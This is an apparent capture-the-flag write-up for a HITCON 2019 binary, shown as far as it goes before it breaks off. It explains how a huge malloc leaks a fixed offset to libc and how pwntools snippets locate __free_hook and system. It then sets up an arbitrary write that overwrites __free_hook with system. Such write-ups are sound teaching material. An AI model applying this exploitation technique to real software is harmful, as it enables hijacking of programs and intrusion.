# CTFhitcon2019
The disassembly of the file is as follows:

![Disassembly of the file](ida.png)

When running checksec we get these results:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      No      0      
```

The program starts by asking for an input size to send to malloc().
After sending the input size it prints out a "Magic" pointer value which points towards where the heap was allocated.

For example, mallocing 100 gives us a pointer to 0x55a29a156260
```
Size:100
Magic:0x55590e00f260
```
/proc/PID/maps
```
55590e00f000-55590e030000 rw-p 00000000 00:00 0                          [heap]
7f3893334000-7f389351b000 r-xp 00000000 08:05 6950739                    /CTFhitcon2019/libc.so.6
```
In order for malloc to allocate a huge page it needs to be given a size of 0x1000000 (Decimal 16777216)
Doing this changes where the heap chunk is allocated and is placed near libc. When running the program twice allocating a huge page, we observe something peculiar with the proc/PID/maps output
Run 1:
```
Size:16777216
Magic:0x7f0aadd25010
```
/proc/PID/maps
```
5567221bc000-5567221dd000 rw-p 00000000 00:00 0                          [heap]
7f0aadd25000-7f0aaed26000 rw-p 00000000 00:00 0 
7f0aaed26000-7f0aaef0d000 r-xp 00000000 08:05 6950739                    /CTFhitcon2019/libc.so.6
```
libc start is at 0x7f0aaed26000. Magic is at 0x7f0aadd25010. Difference is 0x1000FF0
Run 2:
```
Size:16777216
Magic:0x7f2aeafd4010
```
/proc/PID/maps
```
55f249f64000-55f249f85000 rw-p 00000000 00:00 0                          [heap]
7f2aeafd4000-7f2aebfd5000 rw-p 00000000 00:00 0 
7f2aebfd5000-7f2aec1bc000 r-xp 00000000 08:05 6950739                    /CTFhitcon2019/libc.so.6
```
libc start is 0x7f2aebfd5000. Magic is at 0x7f2aeafd4010. Difference is 0x1000FF0

This means that every time we allocated a huge page with malloc magic will be a fixed distance from libc of 0x1000FF0.
Now that we know where libc starts we can leverage that to get the addresses of __free_hook__ and __system__ by using pwntools like so:
```
libc = ELF('libc.so.6')
free_hook = libc.symbols["__free_hook"]
system = libc.symbols["system"]
```
After getting the Magic value we are able to assign all of the variables we will be using
```
libc_offset = 0x1000FF0
free_hook = 0x3ed8e8
system = 0x4f440
libcBase = magic+libc_offset
```

After setting up our environment by alloating a hugepage we are presented with the prompt
```
Offset & Value:
```
From the disassembly we can see that it is expecting input in the format "%lx %lx" which means it is looking for long hex input. This means we don't need to format our input in a special way and can send addresses "as is".
What the program does with Offset and Value is it passes value to the offset of our malloced value. For example:
```
mValue[offset] = value
```
The program asks for Offset & Value twice.
The first Offset and Value we send is (libc_offset+free_hook)/8 for the offset and (libcBase+system) for the value
